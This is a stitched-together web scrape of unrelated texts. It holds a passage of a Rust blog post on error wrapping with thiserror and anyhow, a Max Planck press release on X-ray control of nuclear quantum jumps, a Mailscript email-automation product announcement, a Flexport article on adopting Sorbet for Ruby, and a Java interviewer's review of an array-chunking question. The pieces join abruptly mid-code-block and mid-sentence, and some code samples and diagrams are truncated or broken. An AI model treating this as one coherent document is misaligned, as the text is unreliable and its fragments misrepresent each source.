<h2 id="shoes-off-get-some-tea-research-time">Shoes off, get some tea: Research time!</h2>

<p>Well, Rust has been around for quite some time now and they always boast about how error handling is a first class citizen and all that. So error handling should be a done deal, right? With a canonical way of dealing with errors, officially documented and all that should be right there, correct?</p>

<p>Oh boy, were you wrong.</p>

<p>Turns out, this is a very active field ofâ€¦mhâ€¦experimentation, lets say. There has been <a href="https://blog.yoshuawuyts.com/error-handling-survey/">a survey</a> recently, listing and quickly describing most the different libraries and ways for error handling that emerged, fallen out of favor, got forked, died anyways, got superseded, fallen out of favor again, etc.
And the opinions seem to change frequently, if you should use <code>error-chain</code> or <code>failure</code> or <code>fehler</code> or <code>snafu</code> or <code>thiserror</code> or <code>anyhow</code> or <code>eyre</code> orâ€¦</p>

<p>You opened a can of hornets there, or whatever that saying is.</p>

<p>Then you find <a href="https://blog.rust-lang.org/inside-rust/2020/11/23/What-the-error-handling-project-group-is-working-on.html">this gem</a> and donâ€™t know if you should laugh or cry. Almost six years after Rust hit 1.0 an error handling project group is formed. Six. Years. <em>(heavy breathing)</em></p>

<p>Well, okay. At least they are sorting it out now. Problem is, you needâ€¦.<em>SIX YEARS? Are you serious?</em>â€¦ahem, sorryâ€¦Problem is, you need helpful error messages now.</p>

<p>After reading a few decent blogs on the topic (like <a href="http://www.sheshbabu.com/posts/rust-error-handling/">this</a> or <a href="https://nick.groenen.me/posts/rust-error-handling/">that</a>), there seems to emerge a consensus, at least for libraries: Return something that derives from <code>std::error::Error</code>. Either implement them by hand, or use a crate that does it for you, using macro magic. like <code>thiserror</code>. Which method you use depends on your level of laziness plus your patience regarding compile times.</p>

<h2 id="examples-vs-reality">Examples vs. Reality</h2>

<p>Another post highlighted <a href="https://doc.rust-lang.org/rust-by-example/error/multiple_error_types/wrap_error.html">error wrapping</a>, a particularly intriguing idea to you.</p>

<p>Unfortunately, all the articles have the understandable, but rather annoying tendency to use very simple example code for illustration purposes. Unrealistically simple, you might even say. They have callstacks of depth 1, return only three kinds of error in total in their API, and their errors are obvious and easily describable (e.g. â€œInput file XY not found in your â€˜counting wordsâ€™ programâ€�).</p>

<p>You have a more complicated callstack, with tons of different errors and code reuse in different places. For example, the function you think is to blame for the above error is <code>copy_from_process()</code>, which calls <code>ptrace::read()</code>, which probably returns something like <code>Failed in ptrace::read: Sys(EIO)</code>.
This function is used in multiple places in your code, e.g.:</p>

<div><div><pre><code>â”œâ”€ init()
â”‚   â”œâ”€ read_auxv()
â”‚   â”‚  â”œâ”€ open(format!("/proc/{}/auxv", self.pid))

<p>Same goes for opening files, which happens in multiple places (two examples of which are shown in <code>init()</code>), so getting <code>FileNotFound</code> without context is going to be equally fun, and so on.</p>



<p>Wrapping errors still sounds like a nice idea, but one layer alone is not going to <del>wrap it</del> cut it.
Going with <code>copy_from_process()</code> as an example, you see a few possibilities:</p>
<ol>
  <li>Wrapping the <code>ptrace</code> error into an <code>CopyFromProcessError</code>, but that gives you nothing (except maybe some context, if you add some)</li>
  <li>With <code>InitError</code>s and <code>DumpingError</code>s that wrap the <code>ptrace</code> errors, you will still not know which section failed and why, but know if it was during <code>init()</code> or not.</li>
</ol>

<p>You might add context to option 2 as well (see below on how), but each section has a variety of reasons why it could fail. Some unique to the section, some shared among a few, some among all of them.</p>

<p>Complex problems sometimes require complex solutions, maybe?</p>

<h2 id="inc-err-ption">Inc <em>Err()</em> ption</h2>

<p>Using <code>thiserror</code> and the fabulous <code>#[from]</code> macro, you quickly define a plethora of errors and wrappers, starting from the deepest, darkest places in your callstack, wrapping your way up:</p>

<div><div><pre><code><span>#[derive(Debug,</span> <span>Error)]</span>

    <span>...</span>
</code></pre></div></div>

<p>The fun part is: You have to touch very little of your existing code, thanks to the automatic conversion from one error to the other, conveniently provided by <code>#[from]</code>:</p>
<div><div><pre><code><span>- pub fn init(&amp;mut self) -&gt; Result&lt;()&gt; {
</span><span>+ pub fn init(&amp;mut self) -&gt; Result&lt;(), InitError&gt; {
</span>     self.read_auxv()?;
     self.enumerate_threads()?;
     self.enumerate_mappings()?;
     Ok(())
 }
</code></pre></div></div>

<p>or</p>

<div><div><pre><code><span>- pub fn get_stack_info(&amp;self, int_stack_pointer: usize) -&gt; Result&lt;(usize, usize)&gt; {
</span><span>+ pub fn get_stack_info(&amp;self, int_stack_pointer: usize) -&gt; Result&lt;(usize, usize), DumperError&gt; {
</span> // snip

    let mapping = self
        .find_mapping(stack_pointer)
<span>-        .ok_or("No mapping for stack pointer found")?;
</span><span>+        .ok_or(DumperError::NoStackPointerMapping)?;
</span>    let offset = stack_pointer - mapping.start_address;
    let distance_to_end = mapping.size - offset;
  // snip
</code></pre></div></div>

<p>If you run your test binary again, you now get</p>
<div><div><pre><code>Failed when writing section AppMemory
</code></pre></div></div>
<p>which isâ€¦.<em>(Throws a stack of papers from the desk)</em>â€¦short. Too short, and not that much more helpful, actually. Well, you know which section is failing. Thats good. But where are all the nice error messages you specified in your errors?</p>

<p>Hm, you do only use <code>println!("{}", error);</code>. Maybe <code>{:?}</code> is better?</p>
<div><div><pre><code>SectionAppMemoryError(CopyFromProcessError(PtraceError(Sys(EIO))))
</code></pre></div></div>

<p>Aha! Now you are getting somewhere! Tiny, tiny, painfully <strong>tiny</strong> steps, but you are getting somewhere! No error texts, but at least a chain!</p>

<p>Normal printing doesnâ€™t seem to recursively go through all the wrapped errors, but stop at the top most. For this, you need to either go through all the errors yourself by hand, or use a crate that does this for you. There are a number of them that provide this, but <code>anyhow</code> will do (its by the same author as <code>thiserror</code>, so interoperability shouldnâ€™t be an issue).</p>

<div><div><pre><code>    <span>println!</span><span>(</span><span>"{:#}"</span><span>,</span> <span>anyhow</span><span>::</span><span>Error</span><span>::</span><span>new</span><span>(</span><span>error</span><span>));</span>

  <p>The extremely precise control of nuclear excitations opens up possibilities of ultra-precise atomic clocks and powerful nuclear batteries</p>
  

  

  <p>From atomic clocks to secure communication to quantum computers: these developments are based on the increasingly better control of the quantum behaviour of electrons in atomic shells with the help of laser light. Now, for the first time, physicists at the Max Planck Institute for Nuclear Physics in Heidelberg have succeeded in precisely controlling quantum jumps in atomic nuclei using X-ray light. Compared with electron systems, nuclear quantum jumps are extreme – with energies up to millions of times higher and incredibly short zeptosecond processes. A zeptosecond is one trillionth of a billionth of a second. The rewards include profound insight into the quantum world, ultra-precise nuclear clocks, and nuclear batteries with enormous storage capacity. The experiment required a sophisticated X-ray flash facility developed by a Heidelberg group led by Jörg Evers as part of an international collaboration.</p>
  
  
<figure data-description="Loss or gain for nuclear excitations: A team from the Max Planck Institute in Heidelberg excites nuclei of iron atoms with a flash of X-ray light and then sends a second such flash onto the sample with different delays and detuning. Then, over a period of about 200 nanoseconds, the researchers measure the intensity of the light with which the nuclei release the absorbed energy (light yellow: high intensity; violet: low intensity). They can choose the delay so that the second flash reduces the excitation and the nuclei release their energy quickly and with high intensity (a). After only 50 nanoseconds, the emission has decreased significantly. In contrast, they still emit a relatively large amount of light after more than 100 nanoseconds if the second pulse amplifies the excitation from the first (b)."

<p>One of the great successes of modern physics is the increasingly precise control of dynamic quantum processes. It enables a deeper understanding of the quantum world with all its oddities and is also a driving force of new quantum technologies. But from the perspective of the atoms, “coherent control” has so far remained superficial: it is the quantum jump of the electrons in the outer shell of the atoms that has become increasingly controllable by lasers. But as Christoph Keitel explains, the atomic nuclei themselves are also quantum systems in which the nuclear building blocks can make quantum jumps between different quantum states.</p>
<h2>Energy-rich quantum jumps for nuclear batteries</h2>
<p>“In addition to this analogy to electron shells, there are huge differences”, explains the Director at the Max Planck Institute for Nuclear Physics in Heidelberg: “They’ve got us so excited!” Quantum jumps between different quantum states are actually jumps on a kind of energy ladder. “And the energies of these quantum jumps are often six orders of magnitude greater than in the electron shell”, says Keitel. A single quantum jump made by a nuclear component can thus pump up to a million times more energy into it – or get it out again. This has given rise to the idea of nuclear batteries with an unprecedented storage capacity.</p>
<p>Such technical applications are still visions of the future. At the moment, research entails addressing and controlling these quantum jumps in a targeted manner. This requires precisely controlled, high-energy X-ray light. The Heidelberg team has been working on such an experimental technique for over 10 years. It has now been used for the first time.</p>
<h2>Accurate frequencies enable ultra-precise atomic clocks</h2>
<p>The quantum states of atomic nuclei offer another important advantage over electron states. Compared with the electronic quantum jumps, they are much more sharply defined. Because this translates directly into more accurate frequencies according to the laws of physics, they can, in principle, be used for extremely precise measurements. For example, this could enable the development of ultra-precise nuclear clocks that would make today’s atomic clocks look like antiquated pendulum clocks. In addition to technical applications of such clocks (e.g. in navigation), they could be used to examine the fundamentals of today’s physics much more precisely. This includes the fundamental question of whether the constants of nature really are constant. However, such precision techniques require the control of quantum transitions in the nuclei.</p>

<h2>Coordinated light flashes enhance or reduce the excitation</h2>
<p>The principle of the Heidelberg experimental technique sounds quite simple at first. It uses pulses (i.e. flashes) of high-energy X-ray light, which are currently provided by the European Synchrotron Radiation Source ESRF in Grenoble. The experiment splits these X-ray pulses in a first sample in such a way that a second &nbsp;pulse follows behind the rest of the first pulse with a time delay. One after the other, both encounter a second sample, the actual object of investigation.</p>
<p>The first pulse is very brief and contains a broad mix of frequencies. Like a shotgun blast, it stimulates a quantum jump in the nuclei; in the first experiment, this was a special quantum state in &nbsp;nuclei of &nbsp;iron atoms. The second pulse is much longer and has an energy that is precisely tuned to the quantum jump. In this way, it can specifically manipulate the quantum dynamics triggered by Pulse 1. The time span between the two pulses can be adjusted. This allows the team to adjust whether the second pulse is more constructive or destructive for the quantum state.</p>
<p>The Heidelberg physicists compare this control mechanism to a swing. With the first pulse, you push it. Depending on the phase of its oscillation in which you give it a second push, it oscillates even stronger or is slowed down.</p>
<h2>Pulse control accurate to a few zeptoseconds</h2>
<p>But what sounds simple is a technical challenge that required years of research. A controlled change in the quantum dynamics of an atomic nucleus requires that the delay of the second pulse is stable on the unimaginably short time scale of a few zeptoseconds. Because only then do the two pulses work together in a controlling way.</p>
<p>A zeptosecond is one trillionth of a billionth of a second – or a decimal point followed by 20 zeroes and a 1. In one zeptosecond, light does not even manage to pass through one per cent of a medium-sized atom. How can you imagine this in relation to our world? “If you imagine that an atom were as big as the Earth, that would be about 50&nbsp;km, says Jörg Evers, who initiated the project.</p>
<h2>The sample is shifted by 45 trillionths of a metre</h2>

<p>The second X-ray pulse is delayed by a tiny displacement of the first sample, also containing iron nuclei with the appropriate quantum transition. “The nuclei selectively store energy from the first X-ray pulse for a short period of time during which the sample is rapidly shifted by about half a wavelength of X-ray light”, explains Thomas Pfeifer, Director at the Max Planck Institute for Nuclear Physics in Heidelberg. This corresponds to about 45 trillionths of a metre. After this tiny movement, the sample emits the second pulse.</p>
<p>The physicists compare their experiment to two tuning forks that are at different distances from a firecracker (Figure 2). The bang first strikes the closer tuning fork, making it vibrate, and then moves on to the second tuning fork. In the meantime, the first tuning fork, now excited, emits sound waves itself, which arrive with a delay at the second fork. Depending on the delay time, this sound either amplifies or dampens the vibrations of the second fork – just like the second push on the oscillating swing, as well as for the case of the excited nuclei.</p>
<p>With this experiment, Jörg Evers, Christoph Keitel, and Thomas Pfeifer and their team from the Max Planck Institute for Nuclear Physics in cooperation with researchers from DESY in Hamburg and the Helmholtz Institute/Friedrich Schiller University in Jena succeeded for the first time in demonstrating coherent control of nuclear excitations. In addition to synchrotron facilities such as those at the ESRF, free-electron lasers (FELs) such as the European XFEL at DESY have recently provided powerful sources of X-ray radiation – even in laser-like quality. This opens up a dynamic future for the emerging field of nuclear quantum optics.</p>

Back in the day, IFTTT let you do some of it, but that feature was killed. There are plenty of solutions to send transactional emails, newsletters, or large volumes. Yet, the average Gmail inbox gets 150 emails a day, and users are still expected to manually process their inbox for hours.</p><blockquote><strong>Email has become a notification center for everything.</strong></blockquote><p>90%+ of emails are transactional or newsletters. This means your inbox is no longer the place where discussions happen. Today's inbox resemble the notification center on your phone: each message contains a single bit of information, and a deep link to an action (such as approving a Pull Request, or opening a comment). Unlike on your phone, you can't easily snooze, dismiss, turn off, have granular control over emails.</p><p><a href="https://mailscript.com/">Mailscript </a>provides developer tools to makes it easy to program email automations. We will first offer <a href="https://docs.mailscript.com/">a CLI</a> and <a href="https://api.mailscript.com/">API </a>for developers (find out more in <a href="https://docs.mailscript.com/">our docs</a>).</p><h2 id="how-it-works">How it works</h2><ol><li>We give you a @mailscript.com address. Once you create yourname@, you can also create aliases, like shopping@yourname.mailscript.com. You can even use + or . like you would in Gmail. This means you can create an infinity of addresses, to use in your automations.</li></ol><figure><img src="https://blog.mailscript.com/content/images/2021/02/Creating-an-alias.png" alt=""><figcaption>How alias creation looks like in the CLI</figcaption></figure><p>2. Every time an email arrives at this address, Mailscript will analyze the email headers, participants, body, and attachments. We make everything neatly available in a JSON object. You'd be surprised how few alternatives there are for an API to deal with inbound emails!</p><p>(We're also creating parsers for prolific email senders. Currently, we understand GitHub emails (Issues, PRs, Actions), with plans to add GSuite, AWS and more soon)</p><p>3. Using <a href="https://docs.mailscript.com/">our CLI</a> and <a href="https://api.mailscript.com/">our API</a>, you can then start creating automations. Every automation in Mailscript consists of:</p><ul><li><strong>Triggers</strong>: Mailscript looks for everything in the email body and meta data. So you can set a trigger if a specific sender, multiple senders, an attachment or file type, specific words, email headers, time of day, or even if a certain amount of emails arrive within a time interval.</li><li><strong>Actions</strong>: you can output to a webhook, receive local notifications on your device, receive an SMS, send an email. We're working on adding integrations (ex: Google Drive).</li></ul><h2 id="examples-of-workflows">Examples of workflows</h2><p>Mailscript automations are called Workflows. Trigger + Action = Workflow.</p><p>Let's say you want to create a workflow called <strong>Post GitHub build failures to Discord</strong>:</p><ul><li>You could have any email that arrives at github@yourname.mailscript.com</li><li>Use the trigger "any GitHub build failure" (<a href="https://api.mailscript.com/">our API</a> makes it easy to parse GitHub emails)</li><li>The action "post a message to Discord"</li></ul><p>That's it! There are so many ways you can automate your email work with Mailscript:</p><p><strong>Groups:</strong></p><ul><li>Trigger: any email to engineering@yourname.mailscript.com</li><li>Alias to bob@gmail.com, joe@gmail.com</li></ul><p><strong>SMS notifications if new version</strong>:</p><ul><li>Trigger: email from this address, and body has "version"</li><li>Action: Send me an SMS</li></ul><p><strong>Run local commands (use Mailscript as a local daemon):</strong></p><ul><li>Trigger: if I send myself an email</li><li>Action: run this local command</li></ul><p>This means you can securely trigger code on a machine, without having to mess with SSH or making an API!</p><h2 id="get-in-touch-">Get in touch 🙌</h2><p>We think there's a lot of exciting use cases for <a href="https://mailscript.com/">Mailscript</a>. <a href="https://mailscript.com/">Signups are open now</a> and we'd love to hear what you think.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><h2 id="4b5e">The Types Must Flow</h2><div><div><div><p><a href="https://medium.com/@william.pride?source=post_page-----ef72d6a18449--------------------------------" rel="noopener"><img alt="William Pride" src="https://miro.medium.com/fit/c/96/96/1*f62Aj7iEXUH8VAN_2QGbXQ.png" width="48" height="48"></a></p></div></div></div></div><p id="9afe">After writing Java for six years at my previous job, onboarding to Flexport’s large Rails monolith was a daunting task. Flexport’s domain — international logistics — is complex. Our operations span the globe and diverse business units from finance and customs to trucking and ocean freight. Even with a perfect codebase with zero incidental complexity the amount of inherent complexity would still be huge.</p><p id="4ebc">Ruby on Rails served us well getting up and running, but as our operations grew, the shortcomings of a “convention over configuration” monolith with a large team became more apparent. Models and code were becoming highly coupled across the team. The data model was very hard for new engineers to learn. Code changes in central parts of the application felt dangerous.</p><p id="ed86">We’ve had a number of initiatives to manage this complexity. We created <a rel="noopener" href="https://flexport.engineering/interactively-visualizing-a-data-model-with-700-entities-ce5b88a49505">visualization</a> tools to better understand our data graph. We created <a rel="noopener" href="https://flexport.engineering/isolating-rails-engines-with-rubocop-210feaba3164">Rails Engines</a> to enforce domain modularity, reducing the surface area engineers had to worry about. We implemented a customized <a rel="noopener" href="https://flexport.engineering/approximating-prettier-for-ruby-with-rubocop-8b863bd64dc6">linter</a> that let us enforce formatting standards and ban unnecessarily confusing or non-idiomatic Ruby.</p><p id="396c">Unfortunately, even well-written and structured Ruby can be difficult for a new engineer to understand. Without type signatures, it’s hard to tell exactly what a method’s inputs and outputs are. You can’t reliably search for class and method definitions or usages since many aren’t <a href="https://stackoverflow.com/a/55306792" rel="noopener">explicitly defined</a> in source code or are called <a href="https://apidock.com/ruby/Object/public_send" rel="noopener">indirectly</a>. IDE features like Find Usages work poorly and so aren’t much help; command line tools can’t warn you about misspelled variables or calls to non-existent methods.</p><p id="6040">The underlying causes of these problems are the same: <a href="https://rollout.io/blog/metaprogramming-in-ruby/" rel="noopener">meta-programming</a> and <a href="https://medium.com/rubycademy/why-ruby-community-encourages-duck-typing-2e5fb529fca1" rel="noopener">dynamic typing</a>. Because Ruby lets you <a href="https://apidock.com/ruby/Module/define_method" rel="noopener">define a method</a> at runtime you can’t possibly know what methods are defined on a class just from searching the source code. There could be any method; there could even be <a href="http://rubylearning.com/satishtalim/ruby_method_missing.html" rel="noopener">all of them</a>! The same is true for constants and even <a href="https://johnragan.wordpress.com/2010/02/18/ruby-metaprogramming-dynamically-defining-classes-and-methods/" rel="noopener">classes</a>. These problems are particularly pronounced in Rails which makes heavy use of these meta-programming constructs.</p><p id="df61">For faster feedback loops during the development, we need <a href="https://en.wikipedia.org/wiki/Static_program_analysis" rel="noopener">static code analysis</a>. Static analysis lets IDEs and tools provide instantaneous error warnings and suggestions. This is much harder for untyped languages; however, some tools can add this functionality. Flexport had already added <a href="https://flow.org/" rel="noopener">Flow</a> to our JavaScript code with great results. Enter <a href="https://sorbet.org/" rel="noopener">Sorbet</a>, a gradual typing system for Ruby.</p><h2 id="5abb">Sorbet</h2><p id="6b1b">Sorbet brings to Ruby the static analysis that makes writing and refactoring code in typed languages so much safer and smoother. Sorbet warns when you try to reference a non-existent class, call a non-existent method, or pass in an argument of the wrong type. Sorbet will warn you about unused variables or unreachable code paths. Sorbet can even top Java in some regards; since Sorbet classes are non-nullable by default, Sorbet will warn you about potential null pointers. Best of all, Sorbet is blazingly <a href="https://blog.nelhage.com/post/why-sorbet-is-fast/#:~:text=Sorbet%20is%20fast.,typecheckers%20we%20are%20aware%20of." rel="noopener">fast</a>.</p><p id="032a">In order to be fast enough, static analysis must work without running your program code. Usually only a tightly optimized C executable will be performant enough.</p><p id="5246">This begs the question: if classes and methods are added by the Ruby runtime, but static code analysis can’t run Ruby code, how can a static tool possibly know all the types available in your Ruby codebase?</p><p id="3942">Sorbet cleverly solves this problem with a two-step process. First, Sorbet generates <code><a href="https://sorbet.org/docs/rbi" rel="noopener">RBI</a></code> (Ruby interface) files that enumerate the dynamic methods and classes used by your code. Sorbet does this by executing your Ruby code and performing <a href="https://en.wikipedia.org/wiki/Type_introspection" rel="noopener">runtime introspection</a> to see what methods and classes are added. Then, Sorbet can merge the types in your Ruby and RBI files and determine whether all the methods and classes referenced actually exist. Sorbet also provides a <a href="https://sorbet.org/docs/sigs" rel="noopener">signature DSL</a> for specifying the argument and return types of your methods. These annotations in your Ruby files work hand-in-hand with the generated RBI files to comprehensively analyze your codebase.</p><p id="0090">Because Ruby has so many constructs that are antithetical to static typing you have to do some work creating these RBI files in order for Sorbet to statically understand your codebase. In the rest of this post we’ll go over how we added Sorbet to our monorepo at Flexport, the pitfalls we ran into, and the tools we made (and found) along the way. We’ve open sourced any tools that we thought might be useful to the broader community.</p><h2 id="a0df">srb init</h2><p id="d9f2">The first step in adding Sorbet to a codebase is running <code><a href="https://sorbet.org/docs/adopting" rel="noopener">srb init</a></code> successfully. This command creates the set of <a href="https://sorbet.org/docs/rbi" rel="noopener">RBI files</a> that statically declare all of the modules, classes, constants, and methods that are added by Ruby at runtime. This is how Sorbet can be aware of methods defined by <code>define_method</code> or <code>method_missing</code> during static analysis — without running any Ruby (slow) code.</p><p id="7bae">Sorbet learns about these dynamic methods and constants through <a href="https://en.wikipedia.org/wiki/Type_introspection" rel="noopener">runtime introspection</a>; that is, by requiring all of your classes and seeing what methods and constants get added. In a large codebase this can take a long time — currently around 45 minutes for us at Flexport, though we understand we’re on the high end. Unsurprisingly, Rails applications seem to have a lot of dynamic methods that need to be enumerated here.</p><p id="b948">Ideally we’d only have run this once; unfortunately, we had to run this multiple times to work out all the issues. Sorbet has a way of unearthing many of the skeletons in a codebase’s closet. Because Sorbet needs to know about every line of your codebase, and because it can only learn by doing, the executable will likely run many files that haven’t been edited or even loaded in years. To get <code>srb init</code> to complete we had to:</p><ol><li id="d974">Remove an old 45MB migration file that was crashing the executable</li><li id="02ce">Remove a 10MB constants file</li><li id="b47e">Ignore many <code>.rb</code> scripts that looped indefinitely or raised an error when run locally. You can ignore files by adding <code><a href="https://sorbet.org/docs/static" rel="noopener"># typed: ignore</a></code> to the top or adding <code>— ignore</code> command to your <code><a href="https://sorbet.org/docs/cli#config-file" rel="noopener">config</a></code> file.</li><li id="0f0a">Fix, delete, or ignore many broken Ruby files that would crash when run due to things like missing constants or imports</li></ol><p id="58b8">The command notified us what file it was running when it crashed. This was usually enough information to work out the issue.</p><h2 id="b5af">Getting to false</h2><p id="697c">Once we managed to get <code>srb init</code> to complete we had a set of RBI files declaring all of the classes and modules we include from <code>gems</code>, as well as the methods and classes dynamically added by our own classes. This meant all of our types were known to Sorbet.</p><p id="6e21">The next step was getting the Sorbet typecheck to pass on our codebase at the minimum strictness level. Sorbet is a <a href="https://sorbet.org/docs/static" rel="noopener">gradual typing system</a>, meaning that you “opt in” each file to a certain level of strictness and increase the strictness over time. Briefly, the levels are:</p><ul><li id="eca0"><code>ignore</code>: Sorbet cannot see this file.</li><li id="277b"><code>false</code>: All referenced classes and constants must be known</li><li id="0d02"><code>true</code>: All referenced methods must be known and called with the correct arity and type of arguments</li><li id="c256"><code>strict</code>: All methods must have <a href="https://sorbet.org/docs/sigs" rel="noopener">signatures</a></li><li id="1a33"><code>strong</code>: Sorbet knows the types of 100% of the variables in the file</li></ul><p id="323f">First we want Sorbet to pass with all files typed at <code>false</code>. At this level Sorbet checks that all of the constants and classes referenced in the codebase are valid, but does not check that methods exist. After running <code>srb init</code> all of the dynamic constants should be in RBI files; the rest should be in our normal Ruby files. So this type level should pass no-sweat, right?</p><p id="8a20">Unfortunately we had more work remaining. Sorbet cannot parse some Ruby constructs and so some of our formerly valid Ruby code was now considered invalid. Usually there was a one-to-one replacement for the disallowed syntax, but we had to fix all of these before Sorbet could pass at even the most lenient type level.</p><p id="e52d"><strong>No Dynamic Includes</strong></p><p id="0937">Ruby in all its permissiveness allows you to include an expression, as in <code>include Rails.application.routes.url_helpers</code> This makes static analysis impossible since Sorbet cannot know what the expression will evaluate to at runtime and so can’t know what constants will and will not be available in the class. All of these have to be replaced with constant includes:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3200/0*TQGtHpNljg-M07K0" width="1600" height="353" srcset="https://miro.medium.com/max/552/0*TQGtHpNljg-M07K0 276w, https://miro.medium.com/max/1104/0*TQGtHpNljg-M07K0 552w, https://miro.medium.com/max/1280/0*TQGtHpNljg-M07K0 640w, https://miro.medium.com/max/1400/0*TQGtHpNljg-M07K0 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*TQGtHpNljg-M07K0?q=20"></p></div></div></div></figure><p id="0393">This was probably the trickiest to fix as we used <code>DryTypes</code> quite extensively and the core import statement is dynamic. Further, most of the classes being imported are themselves dynamically created! One of the joys (or horrors) of adding Sorbet to your codebase is learning about crazy cleverness going on under the hood. To address this particular problem we created a (now open sourced) <a href="https://github.com/Shopify/rubocop-sorbet/pull/20/files#diff-f458393d4e1cd28a518f14a646d97d55" rel="noopener">RuboCop rule</a> that can auto-correct dynamic DryTypes imports to a static formulation and forbids the dynamic form.</p><p id="b950">Sorbet provides its own <a href="https://sorbet.org/docs/tstruct" rel="noopener">Struct</a> system that replaces <code>DryTypes</code> and is statically analyzable by Sorbet. We’re in the process of migrating all of our <code>DryTypes</code> to <code>T::Structs</code>.</p><p id="6464"><strong>No Constant Inheritance</strong></p><p id="267e">The next largest set of changes we had to make was significantly easier; in Sorbet, child classes do not inherit constants from their parents. So, in places where a subclass accessed an inherited constant we either had to add the constant to the subclass, or add the full path to the superclass constant.</p><p id="82fe"><strong>Bad, Bad Code</strong></p><p id="e561">Sorbet will find references to classes and constants that just do not exist in methods that are never called or classes that are never included. Usually these classes had been moved or renamed and some reference was missed in the shuffle. While these errors are a bit embarrassing to find they are also the proof in the pudding: once you’ve added Sorbet they become a thing of the past.</p><p id="ea8f"><strong>And the rest</strong></p><p id="a59d">Sorbet doesn’t allow some random Ruby constructs we were using lightly such as Regular Expression back references, a newer range syntax, and <code>private_class_method</code>. Sorbet is also stricter about using absolute paths than the Rails autoloader will require you to be, so some relative paths have to be updated.</p><p id="5684">We made each of these changes in separate pull requests before adding Sorbet to the codebase so that the changes …</p></div></div></section></div></div>

<p>In the last couple of years, I took close to two hundred interviews. These interviews range from Java engineers with two years of experience to architects holding more than fifteen years of experience. The first round of our interview process, irrespective of the candidate experience, involves solving a small problem in a Google document.&nbsp;</p>



<p>I prefer Google docs because it removes the unnecessary fluff and most candidates are familiar with it. I understand that you may feel awkward and conscious when someone watches you while you are writing code. At the same time, it does give some understanding on how candidates keep calm under pressure, recover from their mistakes, and explain things.</p>



<p>I don’t expect people to write completely syntactically correct formatted code in Google docs. I give them 20 minutes of peaceful time to write the program. I once read that in other tech organizations, it is expected that you explain your approach and your thinking as you write code on a whiteboard (virtual or physical), but I prefer to give people an uninterrupted time so that they don’t have to do two things at a time. I try to make sure that they have understood the problem by giving them a couple of inputs and their expected output.&nbsp;</p>



<p>One question that I have used in most of our L1 interview rounds is shown below. Since 2021 I have stopped using this question so I thought it can be useful to share my analysis on how people performed in attempting this problem.</p>



<p><strong><em>You have to write a function that chunks an array into smaller arrays of specified size. For example, chunks([1,2,3,4,5] , 2) should return [[1,2],[3,4], [5]].</em></strong></p>



<p>Coming up with your own “Fizz Buzz Test”[1] is not easy. I came up with the following requirements on which I evaluate such coding questions [2].</p>



<ol><li>It should be a real problem. The kind of problem you solve in a real-world scenario.</li><li>It should feel simple and give confidence to the developer that they can solve it.</li><li>The solution should not require more than 20 lines of code.</li><li>The problem should not be domain specific that it gives advantage to some candidates.</li><li>It should not require any special data structure, which you don’t use in your day to day work.</li><li>Problem should not have a long text. Anyone should be able to read the problem text in less than a minute.</li><li>It should not require knowledge of a special library function.</li><li>A reasonable developer should be able to write the first version in 15-20 minutes. Candidates do tend to miss a few aspects of the problem, so it can involve more than one iteration.</li></ol>



<p><strong><em>I have used this question for evaluating Java candidates only. It is possible that it is not a good question for your specific programming language. So, please keep </em></strong><strong><em>this point </em></strong><strong><em>in </em></strong><strong><em>your</em></strong><strong><em> mind.</em></strong></p>



<p>There are three skills that I am trying to evaluate about the candidate.</p>



<ol><li>Can they code?</li><li>Can they explain the code they have written?</li><li>Can they explain how they will test the code they have written?</li></ol>



<p>Coming back to the chunks problem, one possible Java solution is shown below.</p>


<pre title="">public static int[][] chunks(int[] numbers, int chunkSize) {
   int length = numbers.length;
   int resultArraySize = (length % chunkSize == 0) ? length / chunkSize : length / chunkSize + 1;
   int[][] result = new int[resultArraySize][];
 
   int numberArrIndex = 0;
   for (int i = 0; i &lt; resultArraySize; i++) {
       int chunkArraySize = i == resultArraySize - 1 &amp;&amp; (length % chunkSize != 0)
               ? length % chunkSize
               : chunkSize;
 
       int[] chunk = new int[chunkArraySize];
 
       for (int j = 0; j &lt; chunkArraySize; j++) {
           chunk[j] = numbers[numberArrIndex++];
       }
       result[i] = chunk;
   }
   return result;
}
</pre>


<p>Java 8 solution using the Stream API is shown below. I don’t expect candidates to write this version.</p>


<pre title="">public static int[][] chunk(int[] numbers, int size) {
   return IntStream.iterate(0, i -&gt; i + size)
           .limit((long) Math.ceil((double) numbers.length / size))
           .mapToObj(cur -&gt; Arrays.copyOfRange(numbers, cur, cur + size &gt; numbers.length ? numbers.length : cur + size))
           .toArray(int[][]::new);
}
</pre>


<p>My analysis is that only 10% of the total candidates solved the problem correctly in the first attempt. 30-40% missed a few scenarios and while explaining the solution they figured out the gaps and suggested improvements to fix their first version. And, remaining 50% failed to write even the partially correct first version.&nbsp;</p>



<p>Following are my observations on the attempts made by people:</p>



<ul><li>Candidates for some reason choose a function name different from chunks. I fail to understand why they don’t use function name as chunks. Some of the names used by candidates <em>getSmallArray</em>, <em>getChunksArray</em>, <em>getMeArray</em>, <em>getRefactorArray</em>, <em>getChunks</em>, <em>splitArrayInChunks</em>, <em>convertArray</em>, <em>splitArray</em>, <em>chunkInputArray</em>, etc.</li><li>Candidates who did well in the attempt first wrote chunks algorithm in plain English and then attempted to write code.</li><li>Candidates struggled to come up with the correct function declaration in the first go. They directly wrote the first version of the problem and then came up with the correct declaration.</li><li>Many candidates struggled with multi-dimensional array syntax.&nbsp;</li><li>The first solution written by most candidates didn’t handle the last chunk correctly. They created all chunks with equal size. So, the answer returned by their solution is [[1,2], [3,4], [5,0]]. Some candidates while explaining the solution with the example input figured out the problem and explained how they will handle this scenario.</li><li>Candidates struggled with the size of the result array. They need to consider whether the array is fully divisible by chunkSize or leaves a remainder.</li><li>Some candidates at times used String. They failed to make much progress.</li><li>Candidates make chunks an instance method of some class. They don’t think whether they should make the method static. For some reason, they think static is bad.</li><li>Some candidates prefer to convert an array to a List and then only they can write code.&nbsp;</li><li>Java developers still struggle with Generics. Only a handful of them were able to convert the program to a version that uses generics.</li><li>Only a handful of developers can eloquently explain the code they have written.&nbsp;</li></ul>



<p>By no means I am underestimating the pressure of giving an interview. Both taking a good interview and giving an interview are difficult. I know it is hard for most of us to write code when someone is watching us in an interview. But, given that this is the kind of code we write everyday and we do have to pair with others. I think it is still a better and scalable way to filter good candidates from average candidates.&nbsp;</p>

